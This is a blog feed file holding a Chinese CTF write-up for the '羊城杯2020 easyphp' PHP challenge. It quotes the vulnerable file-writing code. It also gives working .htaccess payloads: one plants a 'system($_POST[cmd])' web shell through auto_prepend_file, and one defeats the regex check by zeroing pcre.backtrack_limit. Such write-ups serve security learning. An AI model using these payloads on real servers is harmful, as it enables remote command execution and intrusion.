@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"利用.htaccess构成后门\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/07/29/ISITDTU2019-EasyPHP/",
+            "url": "http://odiws.github.io/2024/07/29/ISITDTU2019-EasyPHP/",
+            "title": "[羊城杯2020]easyphp",
+            "date_published": "2024-07-29T14:20:52.000Z",
+            "content_html": "<h2 id=\"羊城杯2020easyphp\"><a class=\"markdownIt-Anchor\" href=\"#羊城杯2020easyphp\">#</a> [羊城杯 2020] easyphp</h2>\n<p>和 [XNUCA2019Qualifier] EasyPHP 基本一样，唯一的区别就是少了 include_once 导致没办法通过 error_log 来做，预期解应该就是那道题的非预期。</p>\n<pre><code> &lt;?php\n    $files = scandir('./'); \n    foreach($files as $file) &#123;\n        if(is_file($file))&#123;\n            if ($file !== &quot;index.php&quot;) &#123;\n                unlink($file);\n            &#125;\n        &#125;\n    &#125;\n    if(!isset($_GET['content']) || !isset($_GET['filename'])) &#123;\n        highlight_file(__FILE__);\n        die();\n    &#125;\n    $content = $_GET['content'];\n    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) &#123;\n        echo &quot;Hacker&quot;;\n        die();\n    &#125;\n    $filename = $_GET['filename'];\n    if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;\n        echo &quot;Hacker&quot;;\n        die();\n    &#125;\n    $files = scandir('./'); \n    foreach($files as $file) &#123;\n        if(is_file($file))&#123;\n            if ($file !== &quot;index.php&quot;) &#123;\n                unlink($file);\n            &#125;\n        &#125;\n    &#125;\n    file_put_contents($filename, $content . &quot;\\nHello, world&quot;);\n?&gt; \n\n</code></pre>\n<p>文件包含，其中文件内容不能有<strong> on|html|type|flag|upload|file</strong> 关键字，文件名只能有字母和点，且每次访问都会删除当前目录除 index.php 之外的文件。</p>\n<p>写个一句话，发现没有被解析，可能是 php 解析配置 <code>php_flag engine</code>  关闭了。配置的问题还是要回归配置文件，虽然主配置文件中关闭了 php 解析，但.htaccess 优先度高于主配置文件，因此我们可以使用.htaccess 执行 php 代码。</p>\n<h3 id=\"法一\"><a class=\"markdownIt-Anchor\" href=\"#法一\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly90eXNraWxsLmdpdGh1Yi5pby9wb3N0cy95Y2IyMDIwLyNjb250ZW50czolRTYlQjMlOTUlRTQlQjglODA=\">法一</span></h3>\n<p><strong>利用.htaccess 构成后门</strong>，payload：</p>\n<pre><code>?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\%0ale%20&quot;.htaccess&quot;%0a%23%20&lt;?php system($_POST[&quot;cmd&quot;]);?&gt;\\\n\n</code></pre>\n<h3 id=\"法二\"><a class=\"markdownIt-Anchor\" href=\"#法二\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly90eXNraWxsLmdpdGh1Yi5pby9wb3N0cy95Y2IyMDIwLyNjb250ZW50czolRTYlQjMlOTUlRTQlQkElOEM=\">法二</span></h3>\n<p><strong>通过 php_value 来设置 preg_macth 正则回溯次数</strong></p>\n<p>payload:</p>\n<pre><code>?filename=.htaccess&amp;content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\\\n\n</code></pre>\n<p>使 preg_match 返回 False，继而绕过了正则判断，然后的过程由于源码没有使用 include，所以应该还是利用.htaccess 写入 php 代码自包含吧，那和前一种方法差不多 (自认为)。</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90eXNraWxsLmdpdGh1Yi5pby9wb3N0cy95Y2IyMDIwLyMlRTYlQjMlOTUlRTQlQjglODA=\">https://tyskill.github.io/posts/ycb2020/# 法一</span></p>\n",
+            "tags": [
+                "利用.htaccess构成后门",
+                "通过php_value来设置preg_macth正则回溯次数"
+            ]
+        }
+    ]
+}
